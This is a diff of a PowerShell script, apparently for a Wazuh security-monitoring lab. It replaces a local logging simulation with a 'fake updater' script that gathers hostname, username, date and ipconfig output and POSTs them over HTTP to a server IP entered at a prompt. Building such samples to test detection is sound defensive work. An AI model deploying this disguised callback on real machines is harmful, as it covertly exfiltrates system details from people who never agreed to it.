@@ -4,18 +4,21 @@
 # ============================================================
 
 @'
-Write-Host "Safe Wazuh Lab Simulation Running"
+$ServerIP = Read-Host "Enter Server 2019 IP Address"
 
-$LogPath = "C:\Wazuh-Test\lab_simulation.txt"
+$Data = @"
+=== Fake Updater Callback ===
+Hostname: $env:COMPUTERNAME
+User: $env:USERNAME
+Date: $(Get-Date)
 
-"==== Safe Wazuh Lab Simulation ====" | Out-File $LogPath
-"Hostname: $env:COMPUTERNAME" | Out-File $LogPath -Append
-"User: $env:USERNAME" | Out-File $LogPath -Append
-"Date: $(Get-Date)" | Out-File $LogPath -Append
-"IP Info:" | Out-File $LogPath -Append
-ipconfig | Out-File $LogPath -Append
+IPCONFIG:
+$(ipconfig)
+"@
 
-Write-Host "Lab simulation complete. Log written to $LogPath"
-'@ | Out-File C:\LabShare\wazuh-lab-test.ps1
+Invoke-WebRequest `
+    -Uri "http://$ServerIP`:8080/" `
+    -Method POST `
+    -Body $Data
 
-Start-Process "powershell" -ArgumentList "-NoExit", "-Command", "cd C:\LabShare; python -m http.server 8080"
+'@ | Out-File C:\LabShare\fake-updater.ps1
